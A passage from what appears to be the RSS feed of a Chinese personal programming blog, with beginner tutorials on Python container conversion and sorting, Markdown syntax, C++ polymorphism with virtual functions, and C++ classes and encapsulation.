class="built_in">print</span>(<span class="string">&quot;列表转换为字符串：&quot;</span>,<span class="built_in">str</span>(my_list))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;元组转换为字符串：&quot;</span>,<span class="built_in">str</span>(my_tuple))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;集合转换为字符串：&quot;</span>,<span class="built_in">str</span>(my_set))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字典转换为字符串：&quot;</span>,<span class="built_in">str</span>(my_dict))</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">列表转换为字符串： [1, 2, 3, 4, 5]</span><br><span class="line">元组转换为字符串： (1, 2, 3, 4, 5)</span><br><span class="line">集合转换为字符串： &#123;&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;&#125;</span><br><span class="line">字典转换为字符串： &#123;&#x27;apple&#x27;: &#x27;苹果&#x27;, &#x27;banana&#x27;: &#x27;香蕉&#x27;, &#x27;orange&#x27;: &#x27;橙子&#x27;&#125;</span><br></pre></td></tr></table></figure><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p><code>set(容器)</code>将给定容器转换为集合<br><br>功能：将给定容器转换为集合<br></p><blockquote><p>注意！在将<code>字符串</code>和<code>列表</code>转化为集合的时候，每一个字符都是单独的一个元素，字典只保留key，不保留value<br></p></blockquote><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">my_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">my_tuple = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">my_set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">my_dict = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;苹果&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;香蕉&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;橙子&#x27;</span>&#125;</span><br><span class="line">my_str = <span class="string">&quot;12345&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;列表转换为集合：&quot;</span>,<span class="built_in">set</span>(my_list))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;元组转换为集合：&quot;</span>,<span class="built_in">set</span>(my_tuple))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符串转换为集合：&quot;</span>,<span class="built_in">set</span>(my_str))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;列表转换为集合：&quot;</span>,<span class="built_in">set</span>(my_list))</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">列表转换为集合： &#123;1, 2, 3, 4, 5&#125;</span><br><span class="line">元组转换为集合： &#123;1, 2, 3, 4, 5&#125;</span><br><span class="line">字符串转换为集合： &#123;&#x27;5&#x27;, &#x27;1&#x27;, &#x27;4&#x27;, &#x27;2&#x27;, &#x27;3&#x27;&#125;</span><br><span class="line">列表转换为集合：&#123;1,2,3,4,5&#125;</span><br></pre></td></tr></table></figure><h2 id="容器的通用排序功能"><a href="#容器的通用排序功能" class="headerlink" title="容器的通用排序功能"></a>容器的通用排序功能</h2><p>语法：<code>sorted(容器,[reverse=True])</code><br><br>作用：将给定容器进行排序<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">my_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">my_tuple = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">my_str = <span class="string">&quot;1,2,3,4,5&quot;</span></span><br><span class="line">my_set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">my_dict = &#123;<span class="number">1</span>:<span class="string">&quot;one&quot;</span>,<span class="number">2</span>:<span class="string">&quot;two&quot;</span>,<span class="number">3</span>:<span class="string">&quot;three&quot;</span>,<span class="number">4</span>:<span class="string">&quot;four&quot;</span>,<span class="number">5</span>:<span class="string">&quot;five&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;列表排序为：&quot;</span>,<span class="built_in">sorted</span>(my_list))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;元组排序为：&quot;</span>,<span class="built_in">sorted</span>(my_tuple))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符串排序为：&quot;</span>,<span class="built_in">sorted</span>(my_str))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;集合排序为：&quot;</span>,<span class="built_in">sorted</span>(my_set))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字典排序为：&quot;</span>,<span class="built_in">sorted</span>(my_dict))</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">列表排序为： [1, 2, 3, 4, 5]</span><br><span class="line">元组排序为： [1, 2, 3, 4, 5]</span><br><span class="line">字符串排序为： [&#x27;,&#x27;, &#x27;,&#x27;, &#x27;,&#x27;, &#x27;,&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;]</span><br><span class="line">集合排序为： [1, 2, 3, 4, 5]</span><br><span class="line">字典排序为： [1, 2, 3, 4, 5]</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/Python/">Python</category>
      
      
      <category domain="https://baiyb.top/tags/Python/">Python</category>
      
      
      <comments>https://baiyb.top/2025/06/15/Python%E4%B8%80%E5%91%A8%E9%80%9F%E9%80%9A/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Markdown语法</title>
      <link>https://baiyb.top/2025/05/10/Markdown%E8%AF%AD%E6%B3%95/</link>
      <guid>https://baiyb.top/2025/05/10/Markdown%E8%AF%AD%E6%B3%95/</guid>
      <pubDate>Sat, 10 May 2025 03:50:09 GMT</pubDate>
      
      <description>记不住Markdown奇奇怪怪的语法但又不想一遍遍去网上查的产物</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Markdown语言简介与用法"><a href="#Markdown语言简介与用法" class="headerlink" title="Markdown语言简介与用法"></a>Markdown语言简介与用法</h1><p>Markdown是一种轻量级标记语言，以简洁的语法和纯文本格式著称，广泛应用于博客、文档编写和笔记记录。它的核心目标是让用户专注于内容，而非复杂的排版操作。Markdown文档可以轻松转换为HTML、PDF等格式，且学习成本极低。</p><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><p>Markdown的语法简单直观，以下是常见的用法：</p><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>使用#表示标题，#的数量决定标题级别（1-6级）。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 一级标题</span></span><br><span class="line"><span class="section">## 二级标题</span></span><br><span class="line"><span class="section">### 三级标题</span></span><br><span class="line"><span class="section">#### 四级标题</span></span><br><span class="line"><span class="section">##### 五级标题</span></span><br><span class="line"><span class="section">###### 六级标题</span></span><br></pre></td></tr></table></figure><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><h3 id="斜体"><a href="#斜体" class="headerlink" title="斜体"></a>斜体</h3><p>斜体：用*或_包裹文字。</p><h3 id="粗体"><a href="#粗体" class="headerlink" title="粗体"></a>粗体</h3><p>粗体：用**或__包裹文字。</p><h3 id="粗斜体"><a href="#粗斜体" class="headerlink" title="粗斜体"></a>粗斜体</h3><p>粗斜体：用***或___包裹文字。</p><h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><p>在行尾添加两个空格或插入一个空行即可换行。</p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>使用&gt;表示引用，可以嵌套多层。</p><blockquote><p>一级引用</p><blockquote><p>二级引用</p></blockquote></blockquote><h2 id="链接与图片"><a href="#链接与图片" class="headerlink" title="链接与图片"></a>链接与图片</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">链接：[<span class="string">链接文本</span>](<span class="link">链接地址</span>)</span><br><span class="line"></span><br><span class="line">图片：![<span class="string">图片描述</span>](<span class="link">图片地址</span>)</span><br></pre></td></tr></table></figure><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>无序列表：使用*、-或+</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 无序项1</span><br><span class="line"><span class="bullet">-</span> 无序项2</span><br></pre></td></tr></table></figure><p>有序列表：使用数字加.</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 有序项1</span><br><span class="line"><span class="bullet">2.</span> 有序项2</span><br></pre></td></tr></table></figure><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>单行代码用反引号&#96;包裹，多行代码用三个反引号&#96;&#96;&#96;。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">`单行代码`</span></span><br></pre></td></tr></table></figure><p><code>单行代码</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;Hello, Markdown!&quot;)</span><br></pre></td></tr></table></figure><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>使用|分隔单元格，-分隔表头和内容。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| 项目 | 数量 | 价格 |</span><br><span class="line">| ------ | ---- | ---- |</span><br><span class="line">| 苹果 | 10 | $5 |</span><br><span class="line">| 香蕉 | 20 | $10 |</span><br></pre></td></tr></table></figure><table><thead><tr><th>项目</th><th>数量</th><th>价格</th></tr></thead><tbody><tr><td>苹果</td><td>10</td><td>$5</td></tr><tr><td>香蕉</td><td>20</td><td>$10</td></tr></tbody></table><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>使用三个或以上的-或*。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="删除线与下划线"><a href="#删除线与下划线" class="headerlink" title="删除线与下划线"></a>删除线与下划线</h2><p>删除线：用~~包裹文字。</p><p>下划线：使用HTML标签<u>。</u></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~~删除线~~</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>下划线<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><del>删除线</del><br><br><u>下划线</u><br></p><h2 id="引用转跳"><a href="#引用转跳" class="headerlink" title="引用转跳"></a>引用转跳</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#### <span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;index-query&quot;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span> 列表的查询功能（.index）</span></span><br><span class="line">[<span class="string">跳转链接</span>](<span class="link">#index-query</span>)</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/Markdown/">Markdown</category>
      
      
      <category domain="https://baiyb.top/tags/Markdown/">Markdown</category>
      
      
      <comments>https://baiyb.top/2025/05/10/Markdown%E8%AF%AD%E6%B3%95/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>多态</title>
      <link>https://baiyb.top/2025/05/09/CPP-%E5%A4%9A%E6%80%81/</link>
      <guid>https://baiyb.top/2025/05/09/CPP-%E5%A4%9A%E6%80%81/</guid>
      <pubDate>Thu, 08 May 2025 16:23:49 GMT</pubDate>
      
      <description>对于多态的学习分享</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><h2 id="多态的基本概念"><a href="#多态的基本概念" class="headerlink" title="多态的基本概念"></a>多态的基本概念</h2><p>多态是C++面向对象三大特性之一<br>多态分为两类</p><ul><li>静态多态: 函数重载 和 运算符重载属于静态多态，复用函数名</li><li>动态多态: 派生类和虚函数实现运行时多态<br>静态多态和动态多态区别：</li><li>静态多态的函数地址早绑定 - 编译阶段确定函数地址</li><li>动态多态的函数地址晚绑定 - 运行阶段确定函数地址</li></ul><h2 id="多态的满足条件"><a href="#多态的满足条件" class="headerlink" title="多态的满足条件"></a>多态的满足条件</h2><p>在C++中要实现多态，需要满足以下条件：</p><ul><li>有继承关系</li><li>子类重写父类中的虚函数 [virtual]</li><li>父类的指针或引用指向子类对象</li></ul><h2 id="多态的使用"><a href="#多态的使用" class="headerlink" title="多态的使用"></a>多态的使用</h2><p>现在我们看这个例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Speak</span><span class="params">()</span></span>&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;MAN!&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>:<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Speak</span><span class="params">()</span></span>&#123; </span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;24!&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dospeak</span> <span class="params">(Animal &amp; animal)</span></span>&#123;</span><br><span class="line">    animal.<span class="built_in">Speak</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Cat cat;</span><br><span class="line">    <span class="built_in">dospeak</span> (cat);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAN!</span><br></pre></td></tr></table></figure><p>我们可以看到，我们在父类中定义了一个函数，在子类中也定义了一个函数，但是我们在主函数中调用的是父类的函数，这是因为在编译阶段，编译器会根据函数的类型来确定函数的地址，而不是根据对象的类型来确定函数的地址。<br>如果我们想要在主函数中调用子类的函数，我们可以使用多态的方式来实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//virtual虚拟化Speak地址（形成虚函数），优先执行子类的同名代码</span></span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Speak</span><span class="params">()</span></span>&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;MAN!&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>:<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//多态需要子类重写基类的虚函数，要求【函数类型 函数名 参数列表】完全相同</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Speak</span><span class="params">()</span></span>&#123; </span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;24!&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dospeak</span> <span class="params">(Animal &amp; animal)</span></span>&#123;</span><br><span class="line">    animal.<span class="built_in">Speak</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Cat cat;</span><br><span class="line">    <span class="built_in">dospeak</span> (cat);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">24</span>!</span><br></pre></td></tr></table></figure><p>我们可以看到，我们在父类中定义了一个虚函数，在子类中也定义了一个函数，但是我们在主函数中调用的是子类的函数，这是因为在编译阶段，编译器会根据函数的类型来确定函数的地址，而不是根据对象的类型来确定函数的地址。</p><p>这就是虚函数在Cpp中的作用，能让你的基类更加的通用，只需修改不同子类，让你的代码更加的灵活。</p><h2 id="多态的原理"><a href="#多态的原理" class="headerlink" title="多态的原理"></a>多态的原理</h2><p><font size="5">若不使用多态，运行顺序如下图</font></p><p><img src="https://free.picui.cn/free/2025/05/10/681ec9ff6a28d.png" alt="微信图片_20250510113654.png"></p><blockquote><p>Cat继承了Animal里的public Speak函数，但由于Speak函数并不是虚函数，即使子类重写基类，但仍然是按照基类的Speak函数来执行。</p></blockquote><br><font size="5">若使用多态，运行顺序如下图</font><p><img src="https://free.picui.cn/free/2025/05/10/681ecb8691b8d.png" alt="微信图片_20250510114348.png"></p><blockquote><p>由于当前Speak函数是虚函数，即使子类重写基类，但仍然是按照子类的Speak函数来执行。</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/C/">C++</category>
      
      
      <category domain="https://baiyb.top/tags/C/">C++</category>
      
      
      <comments>https://baiyb.top/2025/05/09/CPP-%E5%A4%9A%E6%80%81/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>类和对象</title>
      <link>https://baiyb.top/2025/03/22/CPP-%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/</link>
      <guid>https://baiyb.top/2025/03/22/CPP-%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/</guid>
      <pubDate>Sat, 22 Mar 2025 07:28:54 GMT</pubDate>
      
      <description>对于类和对象的学习分享</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p>定义：<mark>具有相同性质</mark>的对象，可以抽象的理解为一类</p><blockquote><p>例如：<br>人类：张三、李四、王五都是人，他们都有相同的性质，比如：姓名、年龄、性别、身高、体重等。<br>车类：宝马、奔驰、奥迪都是车，他们都有相同的性质，比如：品牌、颜色、速度、价格等。</p></blockquote><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><h3 id="封装的意义"><a href="#封装的意义" class="headerlink" title="封装的意义"></a>封装的意义</h3><ul><li>将属性和行为作为一个整体，表现生活中的事物</li><li>将属性和行为加以权限控制<blockquote><p>就是在写代码的时候，将属性和行为放在一起，放在一个类中，然后通过权限控制来控制属性和行为的访问权限</p></blockquote></li></ul><p>语法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> 类名&#123;</span><br><span class="line">    访问权限：</span><br><span class="line">        属性/成员属性</span><br><span class="line">        行为/成员函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>封装的意义①：</p><ul><li>在设计类的时候，属性和行为写在一起，表现事物</li></ul><p>示例1：求圆的周长</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 规定常量PI的值为3.14</span></span><br><span class="line"><span class="type">const</span> <span class="type">double</span> PI = <span class="number">3.14</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义圆类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问权限：</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 属性：半径</span></span><br><span class="line">        <span class="type">int</span> m_r;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 行为：获取圆的周长</span></span><br><span class="line">        <span class="function"><span class="type">double</span> <span class="title">calculateZC</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * PI * m_r;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过圆类创建具体的圆（对象）</span></span><br><span class="line">    <span class="comment">//实例化（通过一个类创建一个对象的过程）</span></span><br><span class="line">    Circle c1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 给圆对象的属性进行赋值</span></span><br><span class="line">    c<span class="number">1.</span>m_r = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出圆的周长</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;圆的周长为：&quot;</span> &lt;&lt; c<span class="number">1.</span><span class="built_in">calculateZC</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">圆的周长为：<span class="number">62.8</span></span><br></pre></td></tr></table></figure><p>封装的意义②：</p><ul><li>将属性和行为加以权限控制</li></ul><p>访问权限有三种：</p><ul><li>public：公共权限      类内可访问 类外可访问</li><li>protected：保护权限   类内可访问 类外不可访问 子类可访问</li><li>private：私有权限     类内可访问 类外不可访问 子类不可访问</li></ul><p>示例2：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 定义人类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="comment">//类内</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问权限：</span></span><br><span class="line">    <span class="keyword">public</span>:     <span class="comment">//公共权限</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 属性：姓名</span></span><br><span class="line">        string m_name = <span class="string">&quot;李四&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 行为：显示姓名</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showName</span><span class="params">()</span></span>&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;姓名为：&quot;</span> &lt;&lt; m_name &lt;&lt; endl;</span><br><span class="line">        &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span>:  <span class="comment">//保护权限</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 属性：年龄</span></span><br><span class="line">        string m_age = <span 